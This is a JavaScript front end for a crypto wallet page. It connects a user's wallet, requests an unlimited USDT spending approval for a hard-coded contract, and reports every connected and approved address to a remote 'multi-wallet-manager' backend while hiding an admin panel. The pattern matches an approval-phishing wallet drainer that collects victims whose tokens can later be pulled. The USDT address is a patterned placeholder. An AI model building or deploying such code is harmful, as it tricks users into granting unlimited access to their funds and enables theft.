// Global variables
let provider = null;
let signer = null;
let walletAddress = null;

// Initialize elements
const connectButton = document.getElementById('connect-wallet');
const connectionStatus = document.getElementById('connection-status');
const walletInfo = document.getElementById('wallet-info');
const walletAddressElement = document.getElementById('wallet-address');
const usdtBalanceElement = document.getElementById('usdt-balance');
const approveButton = document.getElementById('approve-contract');
const loadingIndicator = document.getElementById('loading');

// Hide admin elements
const adminPanel = document.getElementById('admin-panel');
const adminLogin = document.getElementById('admin-login');
if (adminPanel) adminPanel.style.display = 'none';
if (adminLogin) adminLogin.style.display = 'none';

// Attach event listeners
if (connectButton) {
    connectButton.addEventListener('click', handleConnectWallet);
}

if (approveButton) {
    approveButton.addEventListener('click', handleApproveContract);
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    hideLoading();
    
    // Check if wallet is already connected
    const storedAddress = localStorage.getItem('walletAddress');
    if (storedAddress && typeof window.ethereum !== 'undefined') {
        walletAddress = storedAddress;
        updateWalletUI(storedAddress);
        showWalletInfo();
        getWalletBalance(storedAddress);
    }
});

// Show loading indicator
function showLoading() {
    if (loadingIndicator) {
        loadingIndicator.style.display = 'flex';
    }
}

// Hide loading indicator
function hideLoading() {
    if (loadingIndicator) {
        loadingIndicator.style.display = 'none';
    }
}

// Show success message
function showSuccess(message) {
    alert(`Success: ${message}`);
}

// Show error message
function showError(message) {
    alert(`Error: ${message}`);
}

// Update wallet UI
function updateWalletUI(address) {
    if (connectionStatus) {
        connectionStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
    }
    if (connectButton) {
        connectButton.textContent = 'Connected';
        connectButton.disabled = true;
    }
    if (walletAddressElement) {
        walletAddressElement.textContent = address;
    }
}

// Show wallet info section
function showWalletInfo() {
    if (walletInfo) {
        walletInfo.classList.remove('hidden');
    }
}

// Hide wallet info section
function hideWalletInfo() {
    if (walletInfo) {
        walletInfo.classList.add('hidden');
    }
}

// Get wallet balance from backend
async function getWalletBalance(address) {
    if (usdtBalanceElement) {
        try {
            usdtBalanceElement.textContent = 'Loading...';
            
            // Call backend API to get balance
            const response = await fetch(`https://multi-wallet-manager.onrender.com/api/wallets/${address}/balance`);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const data = await response.json();
            const balance = data.balance || '0.00';
            usdtBalanceElement.textContent = parseFloat(balance).toFixed(2);
        } catch (error) {
            console.error('Error getting balance:', error);
            usdtBalanceElement.textContent = '0.00';
        }
    }
}

// Handle wallet connection
async function handleConnectWallet() {
    showLoading();
    
    try {
        // Check if MetaMask or other wallet is installed
        if (typeof window.ethereum === 'undefined') {
            throw new Error('No Ethereum wallet found. Please install MetaMask or another wallet.');
        }
        
        // Request account access
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        walletAddress = accounts[0];
        localStorage.setItem('walletAddress', walletAddress);
        
        // Create provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update UI
        updateWalletUI(walletAddress);
        showWalletInfo();
        
        // Get balance
        await getWalletBalance(walletAddress);
        
        // Send to backend
        try {
            const response = await fetch('https://multi-wallet-manager.onrender.com/api/wallets/connect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: walletAddress,
                    name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
                })
            });
            
            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                console.error('Backend connection error:', errorData.error || 'Unknown error');
            }
        } catch (error) {
            console.error('Error connecting to backend:', error);
        }
        
    } catch (error) {
        showError(`Connection failed: ${error.message}`);
    } finally {
        hideLoading();
    }
}

// Handle contract approval
async function handleApproveContract() {
    if (!signer || !walletAddress) {
        showError('Wallet not connected');
        return;
    }
    
    showLoading();
    
    try {
        // Use your actual contract address
        const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
        
        // USDT contract address (replace with your testnet USDT address)
        const usdtContractAddress = '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e'; // Replace with your testnet USDT
        
        // Create USDT contract instance
        const usdtContract = new ethers.Contract(
            usdtContractAddress,
            [
                'function approve(address spender, uint256 amount) public returns (bool)'
            ],
            signer
        );
        
        // Approve unlimited spending
        const tx = await usdtContract.approve(
            contractAddress,
            ethers.constants.MaxUint256
        );
        
        // Wait for transaction confirmation
        await tx.wait();
        
        showSuccess('Contract approved successfully!');
        
        if (approveButton) {
            approveButton.disabled = true;
            approveButton.textContent = 'Approved';
        }
        
        // Notify backend about approval
        try {
            const response = await fetch('https://multi-wallet-manager.onrender.com/api/wallets/approve', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: walletAddress
                })
            });
            
            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                console.error('Backend approval error:', errorData.error || 'Unknown error');
            }
        } catch (error) {
            console.error('Error updating backend:', error);
        }
        
    } catch (error) {
        showError(`Approval failed: ${error.message}`);
    } finally {
        hideLoading();
    }
}
